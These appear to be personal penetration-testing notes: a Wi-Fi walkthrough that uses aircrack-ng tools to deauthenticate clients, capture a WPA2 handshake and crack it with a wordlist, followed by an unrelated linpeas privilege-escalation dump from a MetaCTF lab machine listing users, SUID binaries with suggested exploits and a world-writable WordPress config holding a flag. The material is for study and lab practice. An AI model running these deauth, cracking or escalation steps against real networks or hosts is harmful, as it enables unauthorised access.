Wireless Penetration Testing Overview

Monday, October 30, 2023

11:49 PM

![](000_Wireless_Penetration_Testing_Overview_000.png){width="12.5in" height="7.0in"}

 

WPA2-Enterprise

Deploying WPA2-Enterprise requires a [**RADIUS server**](https://www.cloudradius.com/), which handles the task of authenticating network users access. The actual authentication process is based on the 802.1x policy and comes in several different systems labelled [**EAP**](https://www.securew2.com/solutions/eap-tls-authentication/). Because each device is authenticated before it connects, a personal, encrypted tunnel is effectively created between the device and the network.

The **WPA2 (Enterprise) RADIUS** combination affords networks the highest level of cybersecurity, especially when X.509 digital certificates are used for authentication. WPA2 Enterprise requires an 802.1X authentication server anyway, so it\'s only logical to implement the best possible authentication security during configuration.

WPA3-Enterprise

A significant improvement that WPA3-Enterprise offers is a requirement for server certificate validation to be configured to confirm the identity of the server to which the device is connecting.

Interested in learning more about WPA3? Get the details about the changes WPA3 is poised to bring in [**this article**](https://www.securew2.com/blog/whats-in-store-with-wpa3/).

 

*From \<<https://www.securew2.com/solutions/wpa2-enterprise-and-802-1x-simplified>\>*

 

![](000_Wireless_Penetration_Testing_Overview_001.png){width="4.489583333333333in" height="4.65625in"}

 

![](000_Wireless_Penetration_Testing_Overview_002.png){width="12.635416666666666in" height="5.614583333333333in"}

 

 

Start our Attack process

 

Make sure no wireless network is connected or set to auto connect to wifi adapter.

 

-   Kill anything network going on

![L-\$ sudo airmon-ng check kill \[sudo\] password for kali: Killing PID 1595 these processes: Name wpa_supplicant ](000_Wireless_Penetration_Testing_Overview_003.png){width="2.6666666666666665in" height="1.7395833333333333in"}

 

-   Set wlan0 in monitoring mode

![kali ) -I---I L-\$ sudo airmon-ng start wlanø pH Y phyø Interface wlanø Driver 88XXau Chipset Realtek Semiconductor Corp. Realtek 8812AU/8821AU 802.11ac WLAN Adapter \[USB Wireless Dual-Band Adapter 2.4/5Ghz (monitor mode enabled) ](000_Wireless_Penetration_Testing_Overview_004.png){width="6.53125in" height="1.71875in"}

 

 

-   Find networks in your range, or the network you are looking for in your assesment

![L-\$ sudo airodump-ng wlanø : FD:E3 88 : 86 88 : 86 A4:97 A8•.A7 : 95 : øø:ca. 72:80: 86 : 91. 82 : 91. AC:91. CH 6 BSSID 64 Elapsed: #Data, #/s CH 11 11 11 11 11 11 11 11 11 11 11 11 11 ENC CIPHER 195 260 195 58 540 130 130 720 260 260 195 130 720 720 720 720 720 195 195 260 720 720 720 720 720 720 720 AUTH PSK PSK PSK PSK PSK PSK PSK SAE PSK PSK PSK PSK SAE PSK PSK PSK SAE PSK PSK PSK PSK PSK SAE PSK PSK PSK SAE ESSID \<length: WlFIE6988C Fios-K9Fdy Gigantor\'s Network serles : 87 : 87 : 33 • 51 • 98 • 98 • 98 : 64 : 46 : 46 : 46 : 73 : FA 24 s PWR -64 -52 -59 2023-11-01 21:29 Beacons 39 39 89 WPA2 WPA2 WPA2 WPA2 WPA2 WPA2 WPA2 WPA3 WPA2 WPA2 WPA2 WPA2 WPA3 WPA2 WPA2 WPA2 WPA3 WPA2 WPA2 WPA2 WPA2 WPA2 WPA3 WPA2 WPA2 WPA2 WPA3 ccmp CCMP ccmp ccmp ccmp ccmp ccmp ccmp ccmp ccmp CCNP CCNP CCNP CCMP CCMP CCMP CCMP CCMP CCMP CCMP ccmp ccmp ccmp ccmp ccmp CCMP CCMP HP-Print-4C-ENW SpectrumSetup-A1 \<length: \<length: Watson Fios-FRF8m-Guest Fios-FRF8m MySpectrumWi Fic8 \<length: theboss2.ø SpectrumSetup-75 Fios-YL5Gm-10T Fios-YL5Gm-Guest Fios-YL5Gm WlFIEA8FCC Rosc02 . 4 Fios-C3J7n Fios-YL5Gm-10T Fios-YL5Gm-Guest Fios-YL5Gm 120 -26 Verizon Verizon Verizon Verizon V7LCS7-10T \_679MXG-10T \_679MXG-Guest \_679MXG ](000_Wireless_Penetration_Testing_Overview_005.png){width="8.885416666666666in" height="5.875in"}

 

-   Set up capture for for the network you are targeting specifically

![L-\$ sudo airodump-ng ---bssid : 04 -w capture wlanø ](000_Wireless_Penetration_Testing_Overview_006.png){width="6.25in" height="0.59375in"}

 

-   Deauth attack a host connected to the network if you are having trouble catching a handshake

![kali sudo aireplay-ng -0 1 -a wlanø• ](000_Wireless_Penetration_Testing_Overview_007.png){width="6.59375in" height="0.7291666666666666in"}

Example sending more than 1 deauth

aireplay-ng \--deauth 1000 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0

 

*From \<<https://www.inkyvoxel.com/wi-fi-deauthentication-attacks-using-aireplay-ng/>\>*

 

 

 

-   Handshake captured

![CH 1 BSSID BSSID 7A:BD: : 05 le-24 74 Elapsed: 42 s PWR -22 2023-11-01 Beacons 399 22:58 #Data, 121 WPA RXQ 33 handshake : CH MB 1 720 Lost 253 7A:BD: : 05 ENC CIPHER AUTH ESSID PSK Fios-YL5Gm-10T WPA2 ccmp STATION Rate Frames 562 Notes Probes EAPOL ](000_Wireless_Penetration_Testing_Overview_008.png){width="8.010416666666666in" height="2.1354166666666665in"}

 

 

-   Use the handshake capture file and a wordlist to crack password

![sudo aircrack-ng -w Reading packets, please Opening capture-05 .cap Read 33128 packets. 1 potential targets cracki ng.txt wait Aircrack-ng 1.7 capture-øs.cap 72 .73% Time left: Master Key 16/22 keys tested 0 seconds KEY FOUND! (344.46 k/s) \[ ane27pane185bet Transient Key EAPOL HMAC 50 54 80 øø CD 02 El øø 09 CD øø øø 85 øø øø 06 3D 05 øø øø 14 05 50 56 øø øø 84 9B 09 øø øø 39 øø øø 47 91 32 øø øø 08 33 38 øø 91 93 AC 57 77 øø 63 23 øø 85 DI 81 øø 86 35 35 øø 05 30 øø øø ](000_Wireless_Penetration_Testing_Overview_009.png){width="6.40625in" height="5.083333333333333in"}

 

 

sudo systemctl restart NetworkManager to restart network manager after

 

 

 

 

 

You can\'t write on systemd PATH

 

╔══════════╣ System timers

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers>

NEXT LEFT LAST PASSED UNIT ACTIVATES

Sun 2023-12-17 17:02:57 UTC 23h left Sat 2023-12-16 17:02:57 UTC 17min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

n/a n/a n/a n/a systemd-readahead-done.timer systemd-readahead-done.service

 

╔══════════╣ Analyzing .timer files

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers>

 

╔══════════╣ Analyzing .socket files

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets>

/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket

/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket

/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout

/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /dev/log

/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout

/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /dev/log

 

╔══════════╣ Unix Sockets Listening

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets>

sed: -e expression #1, char 0: no previous regular expression

/anvil

/bounce

/cleanup

/defer

/dev/log

└─(Read Write)

/discard

/error

/flush

/lmtp

/local

/pickup

/proxymap

/proxywrite

/qmgr

/relay

/retry

/rewrite

/run/dbus/system_bus_socket

└─(Read Write)

/run/gssproxy.sock

└─(Read Write)

/run/rpcbind.sock

└─(Read Write)

/run/systemd/cgroups-agent

/run/systemd/journal/socket

└─(Read Write)

/run/systemd/journal/stdout

└─(Read Write)

/run/systemd/notify

└─(Read Write)

/run/systemd/private

└─(Read Write)

/run/systemd/shutdownd

/run/udev/control

/scache

/showq

/smtp

/tlsmgr

/trace

/var/lib/gssproxy/default.sock

└─(Read Write)

/var/lib/mysql/mysql.sock

└─(Read Write)

/var/run/rpcbind.sock

└─(Read Write)

/verify

/virtual

 

╔══════════╣ D-Bus config files

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus>

Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.PolicyKit1.conf ( \<policy user=\"polkitd\"\>

\<policy user=\"polkitd\"\>)

 

╔══════════╣ D-Bus Service Objects list

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus>

NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION

:1.0 1 systemd root :1.0 - - -

:1.1 534 systemd-logind root :1.1 systemd-logind.service - -

:1.18 881 tuned root :1.18 tuned.service - -

:1.2 533 polkitd polkitd :1.2 polkit.service - -

:1.57 25208 busctl metactf :1.57 session-12.scope 12 -

com.redhat.tuned 881 tuned root :1.18 tuned.service - -

fi.epitest.hostap.WPASupplicant - - - (activatable) - -

fi.w1.wpa_supplicant1 - - - (activatable) - -

org.freedesktop.DBus 537 dbus-daemon dbus org.freedesktop.DBus dbus.service - -

org.freedesktop.PolicyKit1 533 polkitd polkitd :1.2 polkit.service - -

org.freedesktop.hostname1 - - - (activatable) - -

org.freedesktop.import1 - - - (activatable) - -

org.freedesktop.locale1 - - - (activatable) - -

org.freedesktop.login1 534 systemd-logind root :1.1 systemd-logind.service - -

org.freedesktop.machine1 - - - (activatable) - -

org.freedesktop.systemd1 1 systemd root :1.0 - - -

org.freedesktop.timedate1 - - - (activatable) - -

 

 

╔═════════════════════╗

══════════════════════════════╣ Network Information ╠══════════════════════════════

╚═════════════════════╝

╔══════════╣ Hostname, hosts and DNS

centicorp

127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4

::1 localhost localhost.localdomain localhost6 localhost6.localdomain6

 

; generated by /usr/sbin/dhclient-script

search ec2.internal

nameserver 10.10.0.2

 

╔══════════╣ Interfaces

default 0.0.0.0

loopback 127.0.0.0

link-local 169.254.0.0

ens5: flags=4163\<UP,BROADCAST,RUNNING,MULTICAST\> mtu 9001

inet 10.10.4.243 netmask 255.255.255.0 broadcast 10.10.4.255

inet6 fe80::ee:4fff:fef6:89f9 prefixlen 64 scopeid 0x20\<link\>

ether 02:ee:4f:f6:89:f9 txqueuelen 1000 (Ethernet)

RX packets 4411 bytes 2949586 (2.8 MiB)

RX errors 0 dropped 0 overruns 0 frame 0

TX packets 3078 bytes 1394009 (1.3 MiB)

TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

 

lo: flags=73\<UP,LOOPBACK,RUNNING\> mtu 65536

inet 127.0.0.1 netmask 255.0.0.0

inet6 ::1 prefixlen 128 scopeid 0x10\<host\>

loop txqueuelen 1000 (Local Loopback)

RX packets 6 bytes 416 (416.0 B)

RX errors 0 dropped 0 overruns 0 frame 0

TX packets 6 bytes 416 (416.0 B)

TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

 

 

╔══════════╣ Active Ports

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports>

tcp 0 0 0.0.0.0:3306 0.0.0.0:\* LISTEN -

tcp 0 0 0.0.0.0:111 0.0.0.0:\* LISTEN -

tcp 0 0 0.0.0.0:22 0.0.0.0:\* LISTEN -

tcp 0 0 127.0.0.1:25 0.0.0.0:\* LISTEN -

tcp6 0 0 :::111 :::\* LISTEN -

tcp6 0 0 :::80 :::\* LISTEN -

tcp6 0 0 :::22 :::\* LISTEN -

tcp6 0 0 ::1:25 :::\* LISTEN -

 

╔══════════╣ Can I sniff with tcpdump?

No

 

 

 

82 827k 82 680k 0 0 46835 0 0:00:18 0:00:14 0:00:04 34349 ╔═══════════════════╗

═══════════════════════════════╣ Users Information ╠═══════════════════════════════

╚═══════════════════╝

╔══════════╣ My user

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users>

uid=1001(metactf) gid=1001(metactf) groups=1001(metactf)

 

╔══════════╣ Do I have PGP keys?

/usr/bin/gpg

netpgpkeys Not Found

netpgp Not Found

 

╔══════════╣ Checking \'sudo -l\', /etc/sudoers, and /etc/sudoers.d

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid>

 

╔══════════╣ Checking sudo tokens

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens>

ptrace protection is disabled (0), so sudo tokens could be abused

 

╔══════════╣ Checking Pkexec policy

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2>

 

╔══════════╣ Superusers

root:x:0:0:root:/root:/bin/bash

 

╔══════════╣ Users with console

apache:x:48:48:Apache:/usr/share/httpd:/bin/bash

centos:x:1000:1000:Cloud User:/home/centos:/bin/bash

metactf:x:1001:1001::/home/metactf:/bin/bash

root:x:0:0:root:/root:/bin/bash

 

╔══════════╣ All users & groups

uid=0(root) gid=0(root) groups=0(root)

uid=1000(centos) gid=1000(centos) groups=1000(centos),4(adm),10(wheel),190(systemd-journal)

uid=1001(metactf) gid=1001(metactf) groups=1001(metactf)

uid=11(operator) gid=0(root) groups=0(root)

uid=12(games) gid=100(users) groups=100(users)

uid=14(ftp) gid=50(ftp) groups=50(ftp)

uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)

uid=1(bin) gid=1(bin) groups=1(bin)

uid=27(mysql) gid=27(mysql) groups=27(mysql)

uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)

uid=2(daemon\[0m\[0m) gid=2(daemon\[0m\[0m) groups=2(daemon\[0m\[0m)

uid=32(rpc) gid=32(rpc) groups=32(rpc)

uid=3(adm) gid=4(adm) groups=4(adm)

uid=48(apache) gid=48(apache) groups=48(apache),10(wheel)

uid=4(lp) gid=7(lp) groups=7(lp)

uid=5(sync) gid=0(root) groups=0(root)

uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)

uid=6(shutdown) gid=0(root) groups=0(root)

uid=74(sshd) gid=74(sshd) groups=74(sshd)

uid=7(halt) gid=0(root) groups=0(root)

uid=81(dbus) gid=81(dbus) groups=81(dbus)

uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)

uid=8(mail) gid=12(mail) groups=12(mail)

uid=998(chrony) gid=995(chrony) groups=995(chrony)

uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)

uid=99(nobody) gid=99(nobody) groups=99(nobody)

 

╔══════════╣ Login now

17:20:49 up 32 min, 1 user, load average: 0.29, 0.15, 0.10

USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT

metactf pts/0 10.10.1.252 17:20 25.00s 0.67s 0.00s sed -E s,centos\|apache\|metactf\|ImPoSSssSiBlEee,?\[1;96m&?\[0m,

 

╔══════════╣ Last logons

reboot system boot Sat Oct 10 07:48:14 2020 - Sat Oct 10 07:50:26 2020 (00:02) 0.0.0.0

centos pts/0 Sat Oct 10 07:47:51 2020 - Sat Oct 10 07:47:56 2020 (00:00) 192.241.130.98

reboot system boot Sat Oct 10 07:39:58 2020 - Sat Oct 10 07:47:59 2020 (00:08) 0.0.0.0

metactf pts/0 Sat Oct 10 07:38:40 2020 - Sat Oct 10 07:38:59 2020 (00:00) 192.241.130.98

reboot system boot Sat Oct 10 07:38:27 2020 - Sat Oct 10 07:39:40 2020 (00:01) 0.0.0.0

centos pts/0 Sat Oct 10 07:37:35 2020 - Sat Oct 10 07:38:11 2020 (00:00) 192.241.130.98

centos pts/0 Sat Oct 10 07:37:20 2020 - Sat Oct 10 07:37:24 2020 (00:00) 192.241.130.98

reboot system boot Sat Oct 10 07:34:06 2020 - Sat Oct 10 07:39:40 2020 (00:05) 0.0.0.0

 

wtmp begins Sat Oct 10 07:34:06 2020

 

╔══════════╣ Last time logon each user

Username Port From Latest

centos pts/0 192.241.130.98 Wed Oct 14 06:57:46 +0000 2020

metactf pts/0 10.10.1.252 Sat Dec 16 17:20:13 +0000 2023

 

╔══════════╣ Do not forget to test \'su\' as any other user with shell: without password and with their names as password (I don\'t do it in FAST mode\...)

 

╔══════════╣ Do not forget to execute \'sudo -l\' without password or with valid password (if you know it)!!

 

 

 

84 827k 84 696k 0 0 38414 0 0:00:22 0:00:18 0:00:04 28147 ╔══════════════════════╗

═════════════════════════════╣ Software Information ╠═════════════════════════════

╚══════════════════════╝

╔══════════╣ Useful software

/usr/bin/base64

/usr/bin/curl

/usr/bin/make

/usr/bin/nc

/usr/bin/ncat

/usr/bin/perl

/usr/bin/php

/usr/bin/ping

/usr/bin/python

/usr/bin/python2

/usr/bin/python2.7

/usr/bin/python3

/usr/bin/python3.6

/usr/bin/sudo

/usr/bin/wget

 

╔══════════╣ Installed Compilers

 

╔══════════╣ MySQL version

/bin/mdb_cli Ver 15.1 Distrib 5.5.65-MariaDB, for Linux (x86_64) using readline 5.1

 

 

═╣ MySQL connection using default root/root \...\...\..... No

═╣ MySQL connection using root/toor \...\...\...\...\...\.... No

═╣ MySQL connection using root/NOPASS \...\...\...\...\..... No

 

╔══════════╣ Searching mysql credentials and exec

 

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)

Apache version: apache2 Not Found

Server version: Apache/2.4.6 (CentOS)

Server built: Apr 2 2020 13:13:23

Nginx version: nginx Not Found

 

══╣ PHP exec extensions

 

 

-rw-r\--r\--. 1 root root 63204 Sep 30 2020 /etc/php.ini

allow_url_fopen = On

allow_url_include = Off

odbc.allow_persistent = On

ibase.allow_persistent = 1

mysqli.allow_persistent = On

pgsql.allow_persistent = On

 

 

 

╔══════════╣ Analyzing Http conf Files (limit 70)

-rw-r\--r\--. 1 root root 11753 Oct 10 2020 /etc/httpd/conf/httpd.conf

-rw-r\--r\--. 1 root root 77 Nov 27 2019 /usr/lib/tmpfiles.d/httpd.conf

 

╔══════════╣ Analyzing Wordpress Files (limit 70)

-rw-rw-rw- 1 apache apache 3239 Oct 10 2020 /var/www/html/wp-config.php

define( \'DB_NAME\', \'centicorp\' );

define( \'DB_USER\', \'root\' );

define( \'DB_PASSWORD\', \'MetaCTF{there_has_to_be_a_better_way_to_store_this_right?}\' );

define( \'DB_HOST\', \'localhost\' );

 

╔══════════╣ Analyzing Rsync Files (limit 70)

-rw-r\--r\--. 1 root root 458 Apr 1 2020 /etc/rsyncd.conf

 

 

╔══════════╣ Searching ssl/ssh files

╔══════════╣ Analyzing SSH Files (limit 70)

 

 

 

 

 

-rw-r\--r\--. 1 root root 162 Oct 9 2020 /etc/ssh/ssh_host_ecdsa_key.pub

-rw-r\--r\--. 1 root root 82 Oct 9 2020 /etc/ssh/ssh_host_ed25519_key.pub

-rw-r\--r\--. 1 root root 382 Oct 9 2020 /etc/ssh/ssh_host_rsa_key.pub

-rw-r\--r\--. 1 root root 1665 May 12 2006 /usr/share/doc/pygpgme-0.3/tests/keys/key1.pub

-rw-r\--r\--. 1 root root 3181 May 12 2006 /usr/share/doc/pygpgme-0.3/tests/keys/key2.pub

-rw-r\--r\--. 1 root root 908 May 12 2006 /usr/share/doc/pygpgme-0.3/tests/keys/passphrase.pub

-rw-r\--r\--. 1 root root 1454 May 12 2006 /usr/share/doc/pygpgme-0.3/tests/keys/revoked.pub

-rw-r\--r\--. 1 root root 4046 May 12 2006 /usr/share/doc/pygpgme-0.3/tests/keys/signonly.pub

 

══╣ Some certificates were found (out limited):

/etc/pki/ca-trust/extracted/pem/objsign-ca-bundle.pem

/etc/pki/ca-trust/source/ca-bundle.legacy.crt

18226PSTORAGE_CERTSBIN

 

══╣ /etc/hosts.allow file found, trying to read the rules:

/etc/hosts.allow

 

 

Searching inside /etc/ssh/ssh_config for interesting info

Host \*

GSSAPIAuthentication yes

ForwardX11Trusted yes

SendEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES

SendEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT

SendEnv LC_IDENTIFICATION LC_ALL LANGUAGE

SendEnv XMODIFIERS

 

╔══════════╣ Analyzing PAM Auth Files (limit 70)

drwxr-xr-x. 2 root root 4096 Oct 9 2020 /etc/pam.d

-rw-r\--r\--. 1 root root 904 Aug 9 2019 /etc/pam.d/sshd

auth requiredpam_sepermit.so

auth substack password-auth

auth include postlogin

-auth optional pam_reauthorize.so prepare

account required pam_nologin.so

account include password-auth

password include password-auth

session required pam_selinux.so close

session required pam_loginuid.so

session required pam_selinux.so open env_params

session required pam_namespace.so

session optional pam_keyinit.so force revoke

session include password-auth

session include postlogin

-session optional pam_reauthorize.so prepare

 

 

╔══════════╣ Analyzing NFS Exports Files (limit 70)

Connected NFS Mounts:

rpc_pipefs /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0

-rw-r\--r\--. 1 root root 0 Jun 7 2013 /etc/exports

 

╔══════════╣ Searching kerberos conf files and tickets

╚ <http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory>

ptrace protection is disabled (0), you might find tickets inside processes memory

-rw-r\--r\--. 1 root root 646 Mar 31 2020 /etc/krb5.conf

\# Configuration snippets may be placed in this directory as well

includedir /etc/krb5.conf.d/

 

\[logging\]

default = [FILE:/var/log/krb5libs.log](FILE://var/log/krb5libs.log)

kdc = [FILE:/var/log/krb5kdc.log](FILE://var/log/krb5kdc.log)

admin_server = [FILE:/var/log/kadmind.log](FILE://var/log/kadmind.log)

 

\[libdefaults\]

dns_lookup_realm = false

ticket_lifetime = 24h

renew_lifetime = 7d

forwardable = true

rdns = false

pkinit_anchors = [FILE:/etc/pki/tls/certs/ca-bundle.crt](FILE://etc/pki/tls/certs/ca-bundle.crt)

\# default_realm = EXAMPLE.COM

default_ccache_name = KEYRING:persistent:%{uid}

 

\[realms\]

\# EXAMPLE.COM = {

\# kdc = kerberos.example.com

\# admin_server = kerberos.example.com

\# }

 

\[domain_realm\]

\# .example.com = EXAMPLE.COM

\# example.com = EXAMPLE.COM

-rw-r\--r\--. 1 root root 369 Apr 1 2020 /usr/share/doc/krb5-libs-1.15.1/examples/krb5.conf

\[libdefaults\]

default_realm = ATHENA.MIT.EDU

 

\[realms\]

\# use \"kdc = \...\" if realm admins haven\'t put SRV records into DNS

ATHENA.MIT.EDU = {

admin_server = kerberos.mit.edu

}

ANDREW.CMU.EDU = {

admin_server = kdc-01.andrew.cmu.edu

}

 

\[domain_realm\]

mit.edu = ATHENA.MIT.EDU

csail.mit.edu = CSAIL.MIT.EDU

.ucsc.edu = CATS.UCSC.EDU

 

\[logging\]

#kdc = CONSOLE

tickets kerberos Not Found

klist Not Found

 

 

 

╔══════════╣ Analyzing Cloud Init Files (limit 70)

-rw-r\--r\--. 1 root root 1234 Jun 23 2020 /etc/cloud/cloud.cfg

lock_passwd: true

 

╔══════════╣ Searching uncommon passwd files (splunk)

passwd file: /etc/pam.d/passwd

passwd file: /etc/passwd

 

╔══════════╣ Analyzing PGP-GPG Files (limit 70)

/usr/bin/gpg

netpgpkeys Not Found

netpgp Not Found

 

-rw\-\-\-\-\-\-- 1 metactf metactf 0 Dec 16 17:16 /home/metactf/.gnupg/pubring.gpg

-rw\-\-\-\-\-\-- 1 metactf metactf 40 Dec 16 17:16 /home/metactf/.gnupg/trustdb.gpg

-rw-r\--r\--. 1 root root 9551 Aug 6 2020 /usr/lib/systemd/import-pubring.gpg

 

drwx\-\-\-\-\-- 2 metactf metactf 60 Dec 16 17:20 /home/metactf/.gnupg

 

 

╔══════════╣ Analyzing Postfix Files (limit 70)

drwxr-xr-x. 2 root root 154 Oct 9 2020 /etc/postfix

-rw-r\--r\--. 1 root root 6105 Apr 1 2020 /etc/postfix/master.cf

\# flags=DRhu user=vmail argv=/usr/local/bin/maildrop -d \${recipient}

\# user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -r \${sender} -m \${extension} \${user}

\# flags=R user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -m \${extension} \${user}

\# flags=Fqhu user=uucp argv=uux -r -n -z -a\$sender - \$nexthop!rmail (\$recipient)

\# flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r \$nexthop (\$recipient)

\# flags=Fq. user=bsmtp argv=/usr/local/sbin/bsmtp -f \$sender \$nexthop \$recipient

\# flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store

\# flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py

 

drwxr-xr-x. 2 root root 4096 Oct 9 2020 /usr/libexec/postfix

-rw-r\--r\--. 1 root root 6105 Apr 1 2020 /usr/libexec/postfix/master.cf

\# flags=DRhu user=vmail argv=/usr/local/bin/maildrop -d \${recipient}

\# user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -r \${sender} -m \${extension} \${user}

\# flags=R user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -m \${extension} \${user}

\# flags=Fqhu user=uucp argv=uux -r -n -z -a\$sender - \$nexthop!rmail (\$recipient)

\# flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r \$nexthop (\$recipient)

\# flags=Fq. user=bsmtp argv=/usr/local/sbin/bsmtp -f \$sender \$nexthop \$recipient

\# flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store

\# flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py

 

-rwxr-xr-x. 1 root root 122032 Apr 1 2020 /usr/sbin/postfix

 

drwx\-\-\-\-\--. 2 postfix root 25 Apr 1 2020 /var/lib/postfix

find: '/var/lib/postfix': Permission denied

 

drwxr-xr-x. 16 root root 201 Apr 1 2020 /var/spool/postfix

find: '/var/spool/postfix/active': Permission denied

find: '/var/spool/postfix/bounce': Permission denied

find: '/var/spool/postfix/corrupt': Permission denied

find: '/var/spool/postfix/defer': Permission denied

find: '/var/spool/postfix/deferred': Permission denied

find: '/var/spool/postfix/flush': Permission denied

find: '/var/spool/postfix/hold': Permission denied

find: '/var/spool/postfix/incoming': Permission denied

find: '/var/spool/postfix/maildrop': Permission denied

find: '/var/spool/postfix/private': Permission denied

find: '/var/spool/postfix/public': Permission denied

find: '/var/spool/postfix/saved': Permission denied

find: '/var/spool/postfix/trace': Permission denied

 

 

╔══════════╣ Analyzing Windows Files (limit 70)

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

-rw-r\--r\--. 1 root root 570 Nov 27 2019 /etc/my.cnf

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

╔══════════╣ Analyzing Other Interesting Files (limit 70)

-rw-r\--r\--. 1 root root 231 Apr 1 2020 /etc/skel/.bashrc

-rw-r\--r\-- 1 metactf metactf 231 Apr 1 2020 /home/metactf/.bashrc

 

 

 

 

 

 

 

 

 

 

 

100 827k 100 827k 0 0 41555 0 0:00:20 0:00:20 \--:\--:\-- 32066

╔════════════════════════════════════╗

══════════════════════╣ Files with Interesting Permissions ╠══════════════════════

╚════════════════════════════════════╝

╔══════════╣ SUID - Check easy privesc, exploits and write perms

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid>

strace Not Found

-rws\--x\--x. 1 root root 24K Apr 1 2020 /usr/bin/chfn \-\--\> SuSE_9.3/10

-rws\--x\--x. 1 root root 24K Apr 1 2020 /usr/bin/chsh

-rwsr-xr-x. 1 root root 73K Aug 9 2019 /usr/bin/chage

-rwsr-xr-x. 1 root root 77K Aug 9 2019 /usr/bin/gpasswd

-rwsr-xr-x. 1 root root 41K Aug 9 2019 /usr/bin/newgrp \-\--\> HP-UX_10.20

-rwsr-xr-x. 1 root root 32K Apr 1 2020 /usr/bin/su

-rwsr-xr-x. 1 root root 44K Apr 1 2020 /usr/bin/mount \-\--\> Apple_Mac_OSX(Lion)\_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

-rwsr-xr-x. 1 root root 32K Apr 1 2020 /usr/bin/umount \-\--\> BSD/Linux(08-1996)

\-\--s\--x\--x. 1 root root 144K Apr 1 2020 /usr/bin/sudo \-\--\> check_if_the_sudo_version_is_vulnerable

-rwsr-xr-x. 1 root root 24K Apr 1 2020 /usr/bin/pkexec \-\--\> Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)

-rwsr-xr-x. 1 root root 57K Aug 8 2019 /usr/bin/crontab

-rwsr-xr-x. 1 root root 28K Apr 1 2020 /usr/bin/passwd \-\--\> Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)

-rwsr-xr-x. 1 root root 11K Apr 1 2020 /usr/sbin/pam_timestamp_check

-rwsr-xr-x. 1 root root 36K Apr 1 2020 /usr/sbin/unix_chkpwd

-rwsr-xr-x. 1 root root 12K Apr 1 2020 /usr/sbin/usernetctl

-rwsr-xr-x. 1 root root 115K Aug 6 2020 /usr/sbin/mount.nfs

-rwsr-xr-x. 1 root root 16K Apr 1 2020 /usr/lib/polkit-1/polkit-agent-helper-1

-rwsr-x\-\--. 1 root dbus 57K Jul 13 2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper

 

╔══════════╣ SGID

╚ <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid>

-r-xr-sr-x. 1 root tty 15K Jun 9 2014 /usr/bin/wall

-rwxr-sr-x. 1 root tty 20K Apr 1 2020 /usr/bin/write

\-\--x\--s\--x. 1 root nobody 374K Aug 9 2019 /usr/bin/ssh-agent

-rwxr-sr-x. 1 root root 11K Apr 1 2020 /usr/sbin/netreport

-rwxr-sr-x. 1 root postdrop 214K Apr 1 2020 /usr/sbin/postdrop

-rwxr-sr-x. 1 root postdrop 258K Apr 1 2020 /usr/sbin/postqueue

-rwx\--s\--x. 1 root utmp 11K Jun 10 2014 /usr/libexec/utempter/utempter

